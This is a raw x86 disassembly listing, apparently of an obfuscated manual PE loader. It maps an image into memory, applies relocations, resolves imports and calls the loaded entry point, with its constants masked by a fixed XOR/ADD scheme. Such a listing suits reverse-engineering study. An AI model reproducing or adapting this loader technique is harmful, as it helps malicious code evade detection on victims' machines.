  426e4c:	push   DWORD PTR [ebp-0x24]
  426e4f:	call   0x4278e6
  426e54:	mov    DWORD PTR [ebp-0x3c],eax
  426e57:	mov    eax,DWORD PTR [ebp-0x10]
  426e5a:	mov    ecx,DWORD PTR [ebp-0x24]
  426e5d:	xor    eax,ebx
  426e5f:	add    eax,esi
  426e61:	cmp    eax,ecx
  426e63:	je     0x426e84
  426e65:	mov    eax,DWORD PTR [ebp+0x8]
  426e68:	mov    ecx,DWORD PTR [ebp-0x50]
  426e6b:	mov    eax,DWORD PTR [eax+0x1e0]
  426e71:	xor    ecx,ebx
  426e73:	add    ecx,esi
  426e75:	push   ecx
  426e76:	mov    ecx,DWORD PTR [ebp-0x10]
  426e79:	xor    ecx,ebx
  426e7b:	add    ecx,esi
  426e7d:	push   ecx
  426e7e:	push   DWORD PTR [ebp-0x24]
  426e81:	call   DWORD PTR [eax+0x18]
  426e84:	pop    edi
  426e85:	pop    esi
  426e86:	pop    ebx
  426e87:	leave  
  426e88:	ret    0x4
  426e8b:	push   ebp
  426e8c:	mov    ebp,esp
  426e8e:	push   ecx
  426e8f:	push   ecx
  426e90:	lea    eax,[ebp-0x8]
  426e93:	mov    DWORD PTR [ebp-0x4],eax
  426e96:	push   esi
  426e97:	mov    esi,DWORD PTR [ebp-0x4]
  426e9a:	mov    eax,0xf881ba2f
  426e9f:	mov    DWORD PTR [esi],eax
  426ea1:	mov    esi,DWORD PTR [ebp-0x8]
  426ea4:	cmp    esi,eax
  426ea6:	pop    esi
  426ea7:	jne    0x426eb1
  426ea9:	mov    BYTE PTR [ecx+0xa],0x83
  426ead:	mov    BYTE PTR [edx+0x8],0x2e
  426eb1:	mov    BYTE PTR [edx+0xa],0x83
  426eb5:	mov    BYTE PTR [ecx+0x2],0x15
  426eb9:	leave  
  426eba:	ret    
  426ebb:	push   ebp
  426ebc:	mov    ebp,esp
  426ebe:	push   ecx
  426ebf:	push   ecx
  426ec0:	lea    eax,[ebp-0x8]
  426ec3:	mov    DWORD PTR [ebp-0x4],eax
  426ec6:	mov    edx,DWORD PTR [ebp-0x4]
  426ec9:	mov    eax,0xf88b0bcb
  426ece:	mov    DWORD PTR [edx],eax
  426ed0:	mov    edx,DWORD PTR [ebp-0x8]
  426ed3:	cmp    edx,eax
  426ed5:	jne    0x426ee6
  426ed7:	mov    eax,DWORD PTR [ebp+0x8]
  426eda:	mov    BYTE PTR [ecx+0x9],0xf
  426ede:	mov    BYTE PTR [eax+0x7],0x56
  426ee2:	mov    BYTE PTR [ecx+0x6],0xe
  426ee6:	mov    BYTE PTR [ecx+0x3],0x1f
  426eea:	leave  
  426eeb:	ret    0x4
  426eee:	push   ebp
  426eef:	mov    ebp,esp
  426ef1:	push   ecx
  426ef2:	push   ecx
  426ef3:	lea    eax,[ebp-0x8]
  426ef6:	mov    DWORD PTR [ebp-0x4],eax
  426ef9:	mov    edx,DWORD PTR [ebp-0x4]
  426efc:	mov    eax,0x7e0da2f
  426f01:	mov    DWORD PTR [edx],eax
  426f03:	mov    edx,DWORD PTR [ebp-0x8]
  426f06:	cmp    edx,eax
  426f08:	jne    0x426f0e
  426f0a:	mov    BYTE PTR [ecx+0x7],0x56
  426f0e:	mov    eax,DWORD PTR [ebp+0x8]
  426f11:	mov    BYTE PTR [ecx+0x1],0x18
  426f15:	mov    BYTE PTR [eax+0x9],0x2f
  426f19:	leave  
  426f1a:	ret    0x4
  426f1d:	push   ebp
  426f1e:	mov    ebp,esp
  426f20:	push   ecx
  426f21:	push   ecx
  426f22:	lea    eax,[ebp-0x8]
  426f25:	mov    DWORD PTR [ebp-0x4],eax
  426f28:	push   esi
  426f29:	mov    esi,DWORD PTR [ebp-0x4]
  426f2c:	mov    eax,0x7060e3c
  426f31:	mov    DWORD PTR [esi],eax
  426f33:	mov    esi,DWORD PTR [ebp-0x8]
  426f36:	cmp    esi,eax
  426f38:	pop    esi
  426f39:	jne    0x426f45
  426f3b:	mov    BYTE PTR [edx+0x4],0x12
  426f3f:	mov    WORD PTR [ecx+0x3],0x121f
  426f45:	mov    BYTE PTR [edx],0x3e
  426f48:	leave  
  426f49:	ret    
  426f4a:	push   ebp
  426f4b:	mov    ebp,esp
  426f4d:	push   ecx
  426f4e:	push   ecx
  426f4f:	lea    eax,[ebp-0x8]
  426f52:	mov    DWORD PTR [ebp-0x4],eax
  426f55:	mov    edx,DWORD PTR [ebp-0x4]
  426f58:	mov    eax,0xf8870b3f
  426f5d:	mov    DWORD PTR [edx],eax
  426f5f:	mov    edx,DWORD PTR [ebp-0x8]
  426f62:	cmp    edx,eax
  426f64:	jne    0x426f71
  426f66:	mov    eax,DWORD PTR [ebp+0x8]
  426f69:	mov    BYTE PTR [ecx+0x8],0xe
  426f6d:	mov    BYTE PTR [eax+0x1],0x18
  426f71:	mov    BYTE PTR [ecx+0x5],0xa
  426f75:	leave  
  426f76:	ret    0x4
  426f79:	push   esi
  426f7a:	mov    ecx,edi
  426f7c:	call   0x426f4a
  426f81:	mov    edx,edi
  426f83:	mov    ecx,esi
  426f85:	mov    BYTE PTR [esi],0x1e
  426f88:	call   0x426f1d
  426f8d:	push   esi
  426f8e:	mov    ecx,edi
  426f90:	mov    BYTE PTR [esi+0x5],0xa
  426f94:	call   0x426eee
  426f99:	push   esi
  426f9a:	mov    BYTE PTR [esi+0x6],0xe
  426f9e:	call   0x426ebb
  426fa3:	mov    BYTE PTR [esi+0x2],0x15
  426fa7:	mov    edx,esi
  426fa9:	jmp    0x426e8b
  426fae:	push   ebp
  426faf:	mov    ebp,esp
  426fb1:	push   ecx
  426fb2:	mov    ecx,DWORD PTR [edx+0x194]
  426fb8:	push   esi
  426fb9:	mov    esi,DWORD PTR [ebp+0x8]
  426fbc:	mov    esi,DWORD PTR [esi]
  426fbe:	mov    DWORD PTR [ecx],esi
  426fc0:	mov    ecx,DWORD PTR [edx+0x194]
  426fc6:	mov    ecx,DWORD PTR [ecx]
  426fc8:	mov    esi,DWORD PTR [edx+0x190]
  426fce:	mov    DWORD PTR [esi],ecx
  426fd0:	mov    eax,DWORD PTR [edx+0x194]
  426fd6:	mov    ecx,DWORD PTR [eax]
  426fd8:	mov    ecx,DWORD PTR [ecx+0x3c]
  426fdb:	add    ecx,DWORD PTR [eax]
  426fdd:	mov    DWORD PTR [ebp-0x4],0xf89ca5a5
  426fe4:	mov    eax,DWORD PTR [ebp-0x4]
  426fe7:	movzx  ecx,WORD PTR [ecx+0x16]
  426feb:	xor    eax,0x75108ae
  426ff0:	add    eax,0x3272f5
  426ff5:	pop    esi
  426ff6:	test   ecx,eax
  426ff8:	je     0x427006
  426ffa:	mov    eax,DWORD PTR [edx+0x1c8]
  427000:	mov    DWORD PTR [eax],0xf89c85a2
  427006:	leave  
  427007:	ret    0x4
  42700a:	push   ebp
  42700b:	mov    ebp,esp
  42700d:	sub    esp,0x70
  427010:	and    DWORD PTR [ebp-0x20],0x0
  427014:	mov    DWORD PTR [ebp-0x18],0xf89cb5a5
  42701b:	mov    DWORD PTR [ebp-0x1c],0xf89c85e5
  427022:	mov    DWORD PTR [ebp-0x2c],0xf89c85a1
  427029:	mov    DWORD PTR [ebp-0x14],0xf89c85a3
  427030:	mov    DWORD PTR [ebp-0x2c],0xf89f05a5
  427037:	mov    eax,DWORD PTR [ebp+0x20]
  42703a:	mov    eax,DWORD PTR [eax+0x194]
  427040:	mov    DWORD PTR [ebp-0xc],eax
  427043:	mov    eax,DWORD PTR [ebp+0x20]
  427046:	push   ebx
  427047:	push   esi
  427048:	mov    esi,DWORD PTR [eax+0x190]
  42704e:	mov    eax,DWORD PTR [ebp+0x20]
  427051:	mov    eax,DWORD PTR [eax+0x18c]
  427057:	mov    DWORD PTR [ebp-0x8],eax
  42705a:	mov    eax,DWORD PTR [eax]
  42705c:	push   edi
  42705d:	mov    DWORD PTR [ebp-0x4],esi
  427060:	test   eax,eax
  427062:	jne    0x42706f
  427064:	push   DWORD PTR [ebp+0x1c]
  427067:	mov    edx,DWORD PTR [ebp+0x20]
  42706a:	call   0x426fae
  42706f:	mov    eax,DWORD PTR [esi]
  427071:	mov    ebx,DWORD PTR [esi]
  427073:	add    ebx,DWORD PTR [eax+0x3c]
  427076:	mov    eax,DWORD PTR [ebp+0xc]
  427079:	mov    ecx,DWORD PTR [ebp-0x8]
  42707c:	mov    ecx,DWORD PTR [ecx]
  42707e:	mov    esi,0x75108ae
  427083:	xor    eax,esi
  427085:	mov    edi,0x3272f5
  42708a:	add    eax,edi
  42708c:	cmp    eax,ecx
  42708e:	jne    0x4272c6
  427094:	mov    eax,DWORD PTR [ebp-0xc]
  427097:	mov    eax,DWORD PTR [eax]
  427099:	mov    DWORD PTR [ebp-0x10],eax
  42709c:	mov    eax,DWORD PTR [ebx+0x50]
  42709f:	mov    DWORD PTR [ebp-0x68],eax
  4270a2:	mov    eax,DWORD PTR [ebp-0x18]
  4270a5:	xor    eax,esi
  4270a7:	add    eax,edi
  4270a9:	mov    DWORD PTR [ebp-0x64],eax
  4270ac:	mov    eax,DWORD PTR [ebp-0x14]
  4270af:	and    DWORD PTR [ebp-0x6c],0x0
  4270b3:	xor    eax,esi
  4270b5:	add    eax,edi
  4270b7:	mov    DWORD PTR [ebp-0x60],eax
  4270ba:	lea    eax,[ebp-0x70]
  4270bd:	push   eax
  4270be:	mov    eax,DWORD PTR [ebp+0x8]
  4270c1:	xor    eax,esi
  4270c3:	add    eax,edi
  4270c5:	push   eax
  4270c6:	mov    eax,DWORD PTR [ebp+0x20]
  4270c9:	add    eax,0xaa
  4270ce:	push   eax
  4270cf:	mov    eax,DWORD PTR [ebp+0x20]
  4270d2:	mov    eax,DWORD PTR [eax+0x198]
  4270d8:	mov    DWORD PTR [ebp-0x70],0x4
  4270df:	push   DWORD PTR [eax]
  4270e1:	mov    eax,DWORD PTR [ebp+0x10]
  4270e4:	call   eax
  4270e6:	mov    ecx,DWORD PTR [ebp-0xc]
  4270e9:	mov    ecx,DWORD PTR [ecx]
  4270eb:	mov    edx,DWORD PTR [ebp-0x8]
  4270ee:	mov    DWORD PTR [ebp-0x6c],eax
  4270f1:	mov    DWORD PTR [ebp+0x1c],eax
  4270f4:	mov    DWORD PTR [edx],ecx
  4270f6:	mov    ecx,DWORD PTR [ebp-0x4]
  4270f9:	mov    DWORD PTR [ecx],eax
  4270fb:	mov    eax,DWORD PTR [ebx+0x50]
  4270fe:	mov    DWORD PTR [ebp-0x68],eax
  427101:	mov    eax,DWORD PTR [ebp-0x1c]
  427104:	xor    eax,esi
  427106:	add    eax,edi
  427108:	mov    DWORD PTR [ebp-0x64],eax
  42710b:	lea    eax,[ebp-0x20]
  42710e:	mov    DWORD PTR [ebp-0x60],eax
  427111:	lea    eax,[ebp-0x70]
  427114:	push   eax
  427115:	mov    eax,DWORD PTR [ebp+0x8]
  427118:	xor    eax,esi
  42711a:	add    eax,edi
  42711c:	push   eax
  42711d:	mov    eax,DWORD PTR [ebp+0x20]
  427120:	add    eax,0xee
  427125:	push   eax
  427126:	mov    eax,DWORD PTR [ebp+0x20]
  427129:	mov    eax,DWORD PTR [eax+0x198]
  42712f:	mov    DWORD PTR [ebp-0x70],0x4
  427136:	push   DWORD PTR [eax]
  427138:	mov    eax,DWORD PTR [ebp+0x10]
  42713b:	call   eax
  42713d:	test   eax,eax
  42713f:	je     0x427164
  427141:	and    DWORD PTR [ebp+0xc],0x0
  427145:	cmp    DWORD PTR [ebx+0x50],0x0
  427149:	jbe    0x427164
  42714b:	mov    eax,DWORD PTR [ebp+0x1c]
  42714e:	mov    ecx,DWORD PTR [ebp-0x10]
  427151:	sub    ecx,eax
  427153:	mov    dl,BYTE PTR [ecx+eax*1]
  427156:	inc    DWORD PTR [ebp+0xc]
  427159:	mov    BYTE PTR [eax],dl
  42715b:	mov    edx,DWORD PTR [ebp+0xc]
  42715e:	inc    eax
  42715f:	cmp    edx,DWORD PTR [ebx+0x50]
  427162:	jb     0x427153
  427164:	mov    edx,DWORD PTR [ebp+0x1c]
  427167:	mov    ecx,DWORD PTR [edx+0x3c]
  42716a:	add    ecx,edx
  42716c:	mov    eax,DWORD PTR [ecx+0xa0]
  427172:	mov    ebx,DWORD PTR [ecx+0x28]
  427175:	add    eax,edx
  427177:	sub    edx,DWORD PTR [ebp-0x10]
  42717a:	add    ebx,DWORD PTR [ebp+0x1c]
  42717d:	mov    DWORD PTR [ebp+0xc],edx
  427180:	mov    DWORD PTR [ebp-0x2c],ecx
  427183:	mov    DWORD PTR [ebp-0x14],ebx
  427186:	mov    DWORD PTR [ebp-0x8],0x0
  42718d:	jmp    0x427209
  42718f:	add    edx,0xfffffff8
  427192:	shr    edx,1
  427194:	mov    DWORD PTR [ebp-0x18],edx
  427197:	je     0x4271f5
  427199:	lea    edx,[eax+0x8]
  42719c:	mov    DWORD PTR [ebp-0x4],edx
  42719f:	mov    edx,DWORD PTR [ebp-0x18]
  4271a2:	mov    DWORD PTR [ebp-0x18],edx
  4271a5:	mov    edx,DWORD PTR [ebp-0x4]
  4271a8:	movzx  edx,WORD PTR [edx]
  4271ab:	mov    DWORD PTR [ebp-0x24],edx
  4271ae:	and    edx,0xfff
  4271b4:	mov    DWORD PTR [ebp-0x28],edx
  4271b7:	mov    edx,DWORD PTR [ebp-0x24]
  4271ba:	shr    edx,0xc
  4271bd:	add    edx,0xffcd8d0b
  4271c3:	xor    edx,esi
  4271c5:	cmp    edx,0xf89c85a0
  4271cb:	jne    0x4271ec
  4271cd:	mov    edx,DWORD PTR [ebp-0x28]
  4271d0:	add    edx,DWORD PTR [ebp+0x1c]
  4271d3:	mov    ebx,DWORD PTR [eax]
  4271d5:	cmp    DWORD PTR [ebx+edx*1],0x0
  4271d9:	je     0x4271e9
  4271db:	mov    ecx,DWORD PTR [ebp+0xc]
  4271de:	add    ecx,DWORD PTR [ebx+edx*1]
  4271e1:	mov    ebx,DWORD PTR [eax]
  4271e3:	mov    DWORD PTR [edx+ebx*1],ecx
  4271e6:	mov    ecx,DWORD PTR [ebp-0x2c]
  4271e9:	mov    ebx,DWORD PTR [ebp-0x14]
  4271ec:	add    DWORD PTR [ebp-0x4],0x2
  4271f0:	dec    DWORD PTR [ebp-0x18]
  4271f3:	jne    0x4271a5
  4271f5:	mov    edx,DWORD PTR [ebp-0xc]
  4271f8:	add    DWORD PTR [ebp-0x8],edx
  4271fb:	mov    edx,DWORD PTR [ebp-0x8]
  4271fe:	cmp    edx,DWORD PTR [ecx+0xa4]
  427204:	jae    0x427217
  427206:	add    eax,DWORD PTR [ebp-0xc]
  427209:	mov    edx,DWORD PTR [eax+0x4]
  42720c:	mov    DWORD PTR [ebp-0xc],edx
  42720f:	test   edx,edx
  427211:	jne    0x42718f
  427217:	mov    eax,DWORD PTR [ebp-0x10]
  42721a:	mov    DWORD PTR [ebp-0x6c],eax
  42721d:	mov    DWORD PTR [ebp-0x70],0x4
  427224:	mov    eax,DWORD PTR [ecx+0x50]
  427227:	mov    DWORD PTR [ebp-0x68],eax
  42722a:	mov    eax,DWORD PTR [ebp-0x1c]
  42722d:	xor    eax,esi
  42722f:	add    eax,edi
  427231:	mov    DWORD PTR [ebp-0x64],eax
  427234:	lea    eax,[ebp-0x20]
  427237:	mov    DWORD PTR [ebp-0x60],eax
  42723a:	lea    eax,[ebp-0x70]
  42723d:	push   eax
  42723e:	mov    eax,DWORD PTR [ebp+0x8]
  427241:	xor    eax,esi
  427243:	add    eax,edi
  427245:	push   eax
  427246:	mov    eax,DWORD PTR [ebp+0x20]
  427249:	add    eax,0xee
  42724e:	push   eax
  42724f:	mov    eax,DWORD PTR [ebp+0x20]
  427252:	mov    eax,DWORD PTR [eax+0x198]
  427258:	push   DWORD PTR [eax]
  42725a:	mov    eax,DWORD PTR [ebp+0x10]
  42725d:	call   eax
  42725f:	mov    eax,DWORD PTR [ebp+0x20]
  427262:	mov    eax,DWORD PTR [eax+0x180]
  427268:	add    eax,DWORD PTR [ebp+0xc]
  42726b:	mov    ecx,DWORD PTR [ebp+0xc]
  42726e:	push   DWORD PTR [ebp+0x18]
  427271:	mov    DWORD PTR [eax],ecx
  427273:	push   DWORD PTR [ebp+0x14]
  427276:	push   DWORD PTR [ebp+0x1c]
  427279:	call   ebx
  42727b:	mov    ecx,DWORD PTR [ebp+0xc]
  42727e:	add    ecx,DWORD PTR [ebp+0x20]
  427281:	lea    eax,[ebp+0x4]
  427284:	mov    DWORD PTR [ebp+0x20],ecx
  427287:	mov    ecx,DWORD PTR [ebp+0x20]
  42728a:	mov    ecx,DWORD PTR [ebp+0x20]
  42728d:	mov    edx,DWORD PTR [ecx+0x190]
  427293:	mov    ecx,DWORD PTR [ebp+0x20]
  427296:	mov    ecx,DWORD PTR [ecx+0x18c]
  42729c:	mov    esi,DWORD PTR [ecx]
  42729e:	cmp    DWORD PTR [eax],esi
  4272a0:	jb     0x4272c1
  4272a2:	mov    esi,DWORD PTR [edx]
  4272a4:	mov    edi,DWORD PTR [edx]
  4272a6:	mov    esi,DWORD PTR [esi+0x3c]
  4272a9:	lea    esi,[edi+esi*1+0x50]
  4272ad:	mov    edi,DWORD PTR [ecx]
  4272af:	add    edi,DWORD PTR [esi]
  4272b1:	cmp    DWORD PTR [eax],edi
  4272b3:	jae    0x4272c1
  4272b5:	mov    esi,DWORD PTR [ecx]
  4272b7:	mov    ecx,DWORD PTR [eax]
  4272b9:	mov    edx,DWORD PTR [edx]
  4272bb:	sub    ecx,esi
  4272bd:	add    edx,ecx
  4272bf:	mov    DWORD PTR [eax],edx
  4272c1:	mov    eax,DWORD PTR [ebp+0xc]
  4272c4:	jmp    0x4272c8
  4272c6:	xor    eax,eax
  4272c8:	pop    edi
  4272c9:	pop    esi
  4272ca:	pop    ebx
  4272cb:	leave  
  4272cc:	ret    0x1c
  4272cf:	push   ebp
  4272d0:	mov    ebp,esp
  4272d2:	sub    esp,0x1c
  4272d5:	push   esi
  4272d6:	mov    esi,eax
  4272d8:	mov    eax,DWORD PTR [ecx+0x190]
  4272de:	cmp    DWORD PTR [eax],0x0
  4272e1:	je     0x4273f1
  4272e7:	test   edx,edx
  4272e9:	je     0x4273f1
  4272ef:	test   esi,esi
  4272f1:	je     0x4273f1
  4272f7:	mov    eax,DWORD PTR [esi+0x88]
  4272fd:	test   eax,eax
  4272ff:	je     0x4273ec
  427305:	cmp    DWORD PTR [esi+0x8c],0x10
  42730c:	je     0x4273ec
  427312:	cmp    DWORD PTR [esi+0x34],edx
  427315:	je     0x4273ec
  42731b:	mov    esi,DWORD PTR [ecx+0x18c]
  427321:	and    DWORD PTR [ebp-0x10],0x0
  427325:	mov    ecx,edx
  427327:	sub    ecx,DWORD PTR [esi]
  427329:	add    eax,edx
  42732b:	movzx  edx,WORD PTR [eax+0xc]
  42732f:	mov    DWORD PTR [ebp-0x1c],ecx
  427332:	movzx  ecx,WORD PTR [eax+0xe]
  427336:	add    ecx,edx
  427338:	je     0x4273ec
  42733e:	lea    ecx,[eax+0x14]
  427341:	push   ebx
  427342:	mov    DWORD PTR [ebp-0x18],ecx
  427345:	mov    esi,0x7fffffff
  42734a:	push   edi
  42734b:	test   DWORD PTR [ecx],esi
  42734d:	je     0x4273ce
  42734f:	mov    edx,DWORD PTR [ecx]
  427351:	and    DWORD PTR [ebp-0xc],0x0
  427355:	and    edx,esi
  427357:	add    edx,eax
  427359:	movzx  edi,WORD PTR [edx+0xe]
  42735d:	movzx  ebx,WORD PTR [edx+0xc]
  427361:	add    edi,ebx
  427363:	je     0x4273ce
  427365:	lea    ecx,[edx+0x14]
  427368:	mov    DWORD PTR [ebp-0x14],ecx
  42736b:	test   DWORD PTR [ecx],esi
  42736d:	je     0x4273b0
  42736f:	mov    ecx,DWORD PTR [ecx]
  427371:	and    DWORD PTR [ebp-0x8],0x0
  427375:	and    ecx,esi
  427377:	add    ecx,eax
  427379:	movzx  edi,WORD PTR [ecx+0xe]
  42737d:	movzx  ebx,WORD PTR [ecx+0xc]
  427381:	add    edi,ebx
  427383:	je     0x4273b0
  427385:	lea    edi,[ecx+0x14]
  427388:	mov    DWORD PTR [ebp-0x4],edi
  42738b:	mov    edi,DWORD PTR [ebp-0x4]
  42738e:	mov    edi,DWORD PTR [edi]
  427390:	test   edi,edi
  427392:	je     0x42739a
  427394:	mov    ebx,DWORD PTR [ebp-0x1c]
  427397:	add    DWORD PTR [edi+eax*1],ebx
  42739a:	movzx  edi,WORD PTR [ecx+0xe]
  42739e:	movzx  ebx,WORD PTR [ecx+0xc]
  4273a2:	inc    DWORD PTR [ebp-0x8]
  4273a5:	add    DWORD PTR [ebp-0x4],0x8
  4273a9:	add    edi,ebx
  4273ab:	cmp    DWORD PTR [ebp-0x8],edi
  4273ae:	jb     0x42738b
  4273b0:	movzx  edi,WORD PTR [edx+0xe]
  4273b4:	movzx  ebx,WORD PTR [edx+0xc]
  4273b8:	mov    ecx,DWORD PTR [ebp-0x14]
  4273bb:	inc    DWORD PTR [ebp-0xc]
  4273be:	add    ecx,0x8
  4273c1:	add    edi,ebx
  4273c3:	mov    DWORD PTR [ebp-0x14],ecx
  4273c6:	cmp    DWORD PTR [ebp-0xc],edi
  4273c9:	jb     0x42736b
  4273cb:	mov    ecx,DWORD PTR [ebp-0x18]
  4273ce:	movzx  edx,WORD PTR [eax+0xe]
  4273d2:	movzx  edi,WORD PTR [eax+0xc]
  4273d6:	inc    DWORD PTR [ebp-0x10]
  4273d9:	add    ecx,0x8
  4273dc:	add    edx,edi
  4273de:	mov    DWORD PTR [ebp-0x18],ecx
  4273e1:	cmp    DWORD PTR [ebp-0x10],edx
  4273e4:	jb     0x42734b
  4273ea:	pop    edi
  4273eb:	pop    ebx
  4273ec:	xor    eax,eax
  4273ee:	inc    eax
  4273ef:	jmp    0x4273f3
  4273f1:	xor    eax,eax
  4273f3:	pop    esi
  4273f4:	leave  
  4273f5:	ret    
  4273f6:	push   ebp
  4273f7:	mov    ebp,esp
  4273f9:	mov    ecx,DWORD PTR [ecx+0x190]
  4273ff:	mov    eax,DWORD PTR [ebp+0xc]
  427402:	sub    esp,0x10
  427405:	push   ebx
  427406:	xor    ebx,ebx
  427408:	push   esi
  427409:	push   edi
  42740a:	cmp    DWORD PTR [ecx],ebx
  42740c:	je     0x427494
  427412:	cmp    eax,ebx
  427414:	je     0x427494
  427416:	cmp    DWORD PTR [eax+0x78],ebx
  427419:	jne    0x427420
  42741b:	xor    eax,eax
  42741d:	inc    eax
  42741e:	jmp    0x427496
  427420:	mov    eax,DWORD PTR [eax+0x78]
  427423:	add    eax,DWORD PTR [ebp+0x8]
  427426:	mov    ecx,DWORD PTR [eax+0x1c]
  427429:	mov    edx,DWORD PTR [eax+0x24]
  42742c:	mov    esi,DWORD PTR [eax+0x14]
  42742f:	mov    edi,DWORD PTR [eax+0x18]
  427432:	add    ecx,DWORD PTR [ebp+0x8]
  427435:	add    edx,DWORD PTR [ebp+0x8]
  427438:	mov    DWORD PTR [ebp-0x4],esi
  42743b:	cmp    esi,edi
  42743d:	ja     0x427442
  42743f:	mov    DWORD PTR [ebp-0x4],edi
  427442:	mov    DWORD PTR [ebp-0x8],ebx
  427445:	cmp    DWORD PTR [ebp-0x4],ebx
  427448:	jbe    0x42741b
  42744a:	cmp    ebx,DWORD PTR [eax+0x14]
  42744d:	jae    0x427455
  42744f:	movzx  esi,WORD PTR [edx+ebx*2]
  427453:	jmp    0x427457
  427455:	mov    esi,ebx
  427457:	lea    esi,[ecx+esi*4]
  42745a:	mov    edi,DWORD PTR [esi]
  42745c:	test   edi,edi
  42745e:	je     0x427489
  427460:	add    edi,DWORD PTR [ebp+0x8]
  427463:	mov    DWORD PTR [ebp-0x10],edi
  427466:	cmp    edi,eax
  427468:	jbe    0x42747a
  42746a:	mov    ebx,DWORD PTR [ebp+0xc]
  42746d:	mov    ebx,DWORD PTR [ebx+0x7c]
  427470:	add    ebx,eax
  427472:	cmp    edi,ebx
  427474:	jae    0x42747a
  427476:	mov    esi,DWORD PTR [esi]
  427478:	jmp    0x427482
  42747a:	sub    edi,DWORD PTR [ebp+0x8]
  42747d:	mov    DWORD PTR [esi],edi
  42747f:	mov    esi,DWORD PTR [ebp-0x10]
  427482:	test   esi,esi
  427484:	je     0x427494
  427486:	mov    ebx,DWORD PTR [ebp-0x8]
  427489:	inc    ebx
  42748a:	mov    DWORD PTR [ebp-0x8],ebx
  42748d:	cmp    ebx,DWORD PTR [ebp-0x4]
  427490:	jb     0x42744a
  427492:	jmp    0x42741b
  427494:	xor    eax,eax
  427496:	pop    edi
  427497:	pop    esi
  427498:	pop    ebx
  427499:	leave  
  42749a:	ret    0x8
  42749d:	push   ebp
  42749e:	mov    ebp,esp
  4274a0:	sub    esp,0x2c
  4274a3:	mov    edx,0xf89c85a5
  4274a8:	mov    DWORD PTR [ebp-0x4],edx
  4274ab:	mov    DWORD PTR [ebp-0x8],0xf89c85a2
  4274b2:	mov    eax,DWORD PTR [ebp-0x4]
  4274b5:	mov    ecx,DWORD PTR [ebp-0x4]
  4274b8:	mov    ecx,DWORD PTR [ebp-0x4]
  4274bb:	mov    ecx,DWORD PTR [ebp-0x4]
  4274be:	mov    ecx,DWORD PTR [ebp-0x4]
  4274c1:	mov    ecx,DWORD PTR [ebp-0x4]
  4274c4:	push   ebx
  4274c5:	mov    ebx,DWORD PTR [ebp+0x10]
  4274c8:	push   esi
  4274c9:	mov    esi,0x75108ae
  4274ce:	mov    DWORD PTR [ebp-0x10],0x352eb2f
  4274d5:	mov    ecx,DWORD PTR [ebp-0x4]
  4274d8:	mov    ebx,DWORD PTR [ebx+0x190]
  4274de:	push   edi
  4274df:	mov    edi,0x3272f5
  4274e4:	xor    ecx,esi
  4274e6:	xor    eax,esi
  4274e8:	add    eax,edi
  4274ea:	add    ecx,edi
  4274ec:	mov    DWORD PTR [ebp-0x18],eax
  4274ef:	cmp    ecx,DWORD PTR [ebx]
  4274f1:	je     0x427772
  4274f7:	mov    ebx,DWORD PTR [ebp-0x4]
  4274fa:	mov    ecx,DWORD PTR [ebp+0xc]
  4274fd:	xor    ebx,esi
  4274ff:	add    ebx,edi
  427501:	cmp    ebx,ecx
  427503:	je     0x427772
  427509:	mov    ebx,DWORD PTR [ebp-0x4]
  42750c:	mov    ecx,DWORD PTR [ecx+0x80]
  427512:	xor    ebx,esi
  427514:	add    ebx,edi
  427516:	cmp    ecx,ebx
  427518:	je     0x42776d
  42751e:	add    ecx,DWORD PTR [ebp+0x8]
  427521:	mov    DWORD PTR [ebp-0x2c],ecx
  427524:	mov    ebx,edx
  427526:	xor    ebx,esi
  427528:	add    ebx,edi
  42752a:	mov    DWORD PTR [ebp-0x10],ebx
  42752d:	mov    ebx,DWORD PTR [ebp-0x10]
  427530:	cmp    ebx,edx
  427532:	je     0x427546
  427534:	mov    edx,DWORD PTR [ebp-0x10]
  427537:	mov    ebx,DWORD PTR [ebp-0x4]
  42753a:	imul   edx,edx,0x14
  42753d:	xor    ebx,esi
  42753f:	add    ebx,edi
  427541:	cmp    DWORD PTR [edx+ecx*1],ebx
  427544:	jne    0x42755d
  427546:	mov    edx,DWORD PTR [ebp-0x10]
  427549:	mov    ebx,DWORD PTR [ebp-0x4]
  42754c:	imul   edx,edx,0x14
  42754f:	xor    ebx,esi
  427551:	add    ebx,edi
  427553:	cmp    DWORD PTR [edx+ecx*1+0x10],ebx
  427557:	je     0x42775f
  42755d:	mov    eax,DWORD PTR [ebp-0x4]
  427560:	mov    ebx,DWORD PTR [ebp-0x4]
  427563:	mov    eax,DWORD PTR [ebp-0x10]
  427566:	imul   eax,eax,0x14
  427569:	add    eax,ecx
  42756b:	mov    ecx,DWORD PTR [eax+0x10]
  42756e:	add    ecx,DWORD PTR [ebp+0x8]
  427571:	xor    ebx,esi
  427573:	mov    DWORD PTR [ebp-0x1c],ecx
  427576:	mov    ecx,DWORD PTR [ebp-0x4]
  427579:	mov    edx,DWORD PTR [ebp-0x4]
  42757c:	xor    ecx,esi
  42757e:	add    ecx,edi
  427580:	xor    edx,esi
  427582:	mov    DWORD PTR [ebp-0x24],ecx
  427585:	mov    ecx,DWORD PTR [eax]
  427587:	add    edx,edi
  427589:	add    ebx,edi
  42758b:	cmp    ecx,edx
  42758d:	je     0x427595
  42758f:	add    ecx,DWORD PTR [ebp+0x8]
  427592:	mov    DWORD PTR [ebp-0x24],ecx
  427595:	mov    ecx,DWORD PTR [ebp-0x4]
  427598:	xor    ecx,esi
  42759a:	add    ecx,DWORD PTR [eax+0xc]
  42759d:	mov    eax,DWORD PTR [ebp+0x8]
  4275a0:	lea    eax,[ecx+eax*1+0x3272f5]
  4275a7:	mov    DWORD PTR [ebp+0xc],eax
  4275aa:	mov    DWORD PTR [ebp-0x28],0xf89c85be
  4275b1:	mov    eax,DWORD PTR [ebp+0x10]
  4275b4:	push   DWORD PTR [ebp+0xc]
  4275b7:	mov    eax,DWORD PTR [eax+0x1e0]
  4275bd:	call   DWORD PTR [eax]
  4275bf:	mov    ecx,DWORD PTR [ebp-0x4]
  4275c2:	xor    ecx,esi
  4275c4:	add    ecx,edi
  4275c6:	mov    DWORD PTR [ebp-0xc],eax
  4275c9:	cmp    ecx,eax
  4275cb:	jne    0x4275df
  4275cd:	mov    eax,DWORD PTR [ebp+0x10]
  4275d0:	push   DWORD PTR [ebp+0xc]
  4275d3:	mov    eax,DWORD PTR [eax+0x1e0]
  4275d9:	call   DWORD PTR [eax+0xc]
  4275dc:	mov    DWORD PTR [ebp-0xc],eax
  4275df:	mov    DWORD PTR [ebp-0x20],0x7f661b2a
  4275e6:	mov    DWORD PTR [ebp-0x20],0xf89c985a
  4275ed:	mov    eax,DWORD PTR [ebp-0x4]
  4275f0:	xor    eax,esi
  4275f2:	add    eax,edi
